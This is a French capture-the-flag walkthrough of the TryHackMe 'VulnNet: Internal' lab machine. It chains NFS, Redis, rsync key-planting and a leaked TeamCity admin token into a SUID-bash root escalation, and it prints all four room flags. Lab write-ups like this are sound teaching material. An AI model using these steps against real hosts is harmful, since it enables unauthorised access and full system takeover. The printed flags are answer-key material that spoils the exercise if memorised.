# TryHackMe: VulnNet: Internal

**Objectif :** enchainer plusieurs services internes mal exposes, a savoir NFS, Redis, rsync, SSH et TeamCity, pour recuperer plusieurs flags intermediaires, obtenir un acces SSH sur la machine, puis exploiter TeamCity pour finir root.

---

## Introduction

La room **VulnNet: Internal** est une machine Linux assez complete. Elle est interessante parce qu'elle ne repose pas sur une seule faille, mais sur un chainage de mauvaises expositions :

- NFS divulgue une configuration
- cette configuration livre l'acces Redis
- Redis donne un second secret et un flag intermediaire
- rsync expose le home d'un utilisateur
- cela permet d'obtenir SSH
- TeamCity tourne en local avec un token reutilisable

Le resultat est une progression tres proche d'un vrai scenario de pentest interne.

---

## Enumeration initiale

Je commence par un scan :

```bash
nmap -sC -sV -Pn -p- <IP>
```

Le scan fait ressortir plusieurs services utiles :

- `22/tcp` - SSH
- `111/tcp` / `2049/tcp` - NFS
- `6379/tcp` - Redis
- `873/tcp` - rsync

Le premier pivot logique est NFS.

---

## NFS: lecture de la configuration

Je liste les exports :

```bash
showmount -e <IP>
```

L'export utile est :

```text
/opt/conf
```

Je le monte :

```bash
sudo mount -t nfs <IP>:/opt/conf /mnt/vulnnet
```

Puis je parcours son contenu :

```bash
find /mnt/vulnnet -type f
```

Le fichier decisif ici est la configuration Redis, qui contient le mot de passe requis.

---

## Redis: flags intermediaires et credentials rsync

Je recupere le mot de passe dans la conf Redis, puis je me connecte :

```bash
redis-cli -h <IP> -a "<REDIS_PASS>"
```

Les cles interessantes sont notamment :

- `internal flag`
- `authlist`

Je lis le flag interne :

```bash
GET "internal flag"
```

### Reponse

**Internal flag:** `THM{ff8e518addbbddb74531a724236a8221}`

Une autre valeur ou un autre bloc de donnees donne les credentials rsync. Je les reutilise ensuite pour interroger le service.

---

## rsync: exposition du home utilisateur

Je liste les modules :

```bash
rsync rsync://<IP>/
```

Puis je me connecte avec les credentials trouves dans Redis.

Je peux alors lire des fichiers du home de `sys-internal`, et notamment retrouver un premier flag "services".

### Reponse

**Services flag:** `THM{0a09d51e488f5fa105d8d866a497440a}`

Le point cle de cette etape n'est pas seulement la lecture. Le module rsync permet aussi d'ecrire. J'en profite donc pour deposer ma cle publique dans `~/.ssh/authorized_keys` de `sys-internal`.

---

## Acces initial via SSH

Une fois ma cle autorisee, je me connecte :

```bash
ssh sys-internal@<IP> -i id_rsa
```

Puis je lis le flag utilisateur :

```bash
cat /home/sys-internal/user.txt
```

### Reponse

**user.txt:** `THM{da7c20696831f253e0afaca8b83c07ab}`

---

## Enumeration locale: TeamCity

Une fois dans la machine, j'enumere les services et processus locaux. Un element ressort tres vite :

```text
TeamCity
```

Le service n'est pas directement expose a l'exterieur, mais il tourne en local. Je cherche dans les logs :

```bash
grep -R "Super user authentication token" /TeamCity/logs 2>/dev/null
```

On y trouve le token super-admin.

Je cree alors un tunnel SSH :

```bash
ssh -L 8111:127.0.0.1:8111 sys-internal@<IP>
```

Puis j'ouvre :

```text
http://127.0.0.1:8111
```

Grace au token, j'obtiens un acces admin sur TeamCity.

---

## Privilege Escalation via TeamCity

L'idee est simple : si TeamCity tourne en root, une build step permet d'executer une commande shell privilegiee.

Deux variantes reviennent souvent a ce stade :

- rendre `/bin/bash` SUID
- ou ecrire une cle dans `/root/.ssh/authorized_keys`

La version la plus directe reste :

```bash
chmod +s /bin/bash
```

Je cree donc un projet TeamCity, une build configuration, puis une build step shell contenant cette commande. Apres execution :

```bash
/bin/bash -p
```

Je confirme que je suis root :

```bash
whoami
```

Puis je lis le dernier flag :

```bash
cat /root/root.txt
```

### Reponse

**root.txt:** `THM{e8996faea46df09dba5676dd271c60bd}`

---

## Resume des flags et points cle

- Services flag `THM{0a09d51e488f5fa105d8d866a497440a}`
- Internal flag `THM{ff8e518addbbddb74531a724236a8221}`
- user.txt `THM{da7c20696831f253e0afaca8b83c07ab}`
- root.txt `THM{e8996faea46df09dba5676dd271c60bd}`

---

## Commandes importantes

### Monter l'export NFS

```bash
sudo mount -t nfs <IP>:/opt/conf /mnt/vulnnet
```

Permet de lire la configuration Redis.

### Lire les cles Redis

```bash
redis-cli -h <IP> -a "<REDIS_PASS>"
KEYS *
GET "internal flag"
```

Extrait secrets et flag intermediaire.

### Utiliser rsync

```bash
rsync rsync://<IP>/
```

Pivot vers les fichiers de `sys-internal`.

### Tunnel TeamCity

```bash
ssh -L 8111:127.0.0.1:8111 sys-internal@<IP>
```

Expose l'interface locale dans le navigateur de l'attaquant.

### Shell root final

```bash
/bin/bash -p
```

Aboutit apres modification des droits via TeamCity.

---

## Conclusion

**VulnNet: Internal** est une tres bonne room de chainage. Elle montre qu'en environnement interne, de petits services "oubliés" comme NFS, Redis ou rsync peuvent progressivement donner de plus en plus de contexte, jusqu'a rendre une interface d'orchestration locale completement exploitable.

***Auteur*** *: Saad Idrissi*
